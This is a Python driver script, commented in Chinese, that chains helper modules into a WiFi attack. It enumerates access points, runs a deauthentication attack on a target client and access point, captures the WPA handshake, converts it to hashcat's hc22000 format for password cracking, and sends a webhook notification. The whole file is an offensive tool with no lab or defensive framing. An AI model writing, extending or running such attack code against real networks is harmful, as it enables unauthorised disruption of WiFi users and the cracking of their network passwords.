from ap_enumeration import ap_enumeration
from station_enumeration import station_enumeration
from deauth_attack import deauth_attack
from wpa_handshake import capture_handshake
from utils import save_pcap, convert_to_hc22000
from webhook import send_to_webhook
import config

def main():
    # 枚举附近的 WiFi 网络
    ap_enumeration()

    # 假设我们已经保存了要攻击的 AP 和设备列表
    target_ap_mac = "xx:xx:xx:xx:xx:xx"
    target_station_mac = "yy:yy:yy:yy:yy:yy"

    # 执行 Deauth 攻击
    deauth_attack(target_station_mac, target_ap_mac)

    # 捕获 WPA 握手
    handshake_packets = capture_handshake(target_ap_mac)

    # 保存并转换握手包
    pcap_file = f"{config.PCAP_SAVE_PATH}/handshake.pcap"
    save_pcap(handshake_packets, pcap_file)
    convert_to_hc22000(pcap_file, config.HCX_TOOL_PATH, "output.hc22000")

    # 发送 Webhook 通知
    send_to_webhook(config.WEBHOOK_URL, "New handshake captured and converted!")

if __name__ == "__main__":
    main()